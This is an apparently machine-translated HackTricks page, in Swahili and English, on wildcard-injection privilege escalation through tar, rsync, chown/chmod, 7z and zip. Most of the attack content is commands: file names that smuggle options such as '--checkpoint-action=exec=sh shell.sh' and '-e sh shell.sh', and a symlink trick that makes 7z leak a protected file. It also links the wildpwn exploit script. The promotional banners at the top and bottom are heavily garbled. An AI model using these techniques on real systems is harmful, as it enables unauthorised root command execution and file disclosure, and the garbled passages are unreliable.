{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Unaweza **kuonyesha mmiliki wa faili na ruhusa unazotaka nakala kwa faili zingine**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Tekeleza amri zisizo na mipaka:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Teza amri zisizo za kawaida:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Katika **7z** hata kutumia `--` kabla ya `*` (kumbuka kwamba `--` inamaanisha kuwa ingizo linalofuata haliwezi kut treated kama vigezo, hivyo ni njia za faili tu katika kesi hii) unaweza kusababisha kosa la kiholela kusoma faili, hivyo ikiwa amri kama ifuatayo inatekelezwa na root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Na unaweza kuunda faili katika folda ambapo hii inatekelezwa, unaweza kuunda faili `@root.txt` na faili `root.txt` kuwa **symlink** kwa faili unayotaka kusoma:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Kisha, wakati **7z** inatekelezwa, itachukulia `root.txt` kama faili inayoshikilia orodha ya faili ambazo inapaswa kubana (hiyo ndiyo maana ya kuwepo kwa `@root.txt`) na wakati 7z inasoma `root.txt` itasoma `/file/you/want/to/read` na **kwa sababu maudhui ya faili hii si orodha ya faili, itatupa kosa** ikionyesha maudhui.

_Maelezo zaidi katika Write-ups ya sanduku CTF kutoka HackTheBox._

## Zip

**Tekeleza amri zisizo na mipaka:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Angalia [**subsrippangithub.cm/sorsarlosp!**
* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Jiunge 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
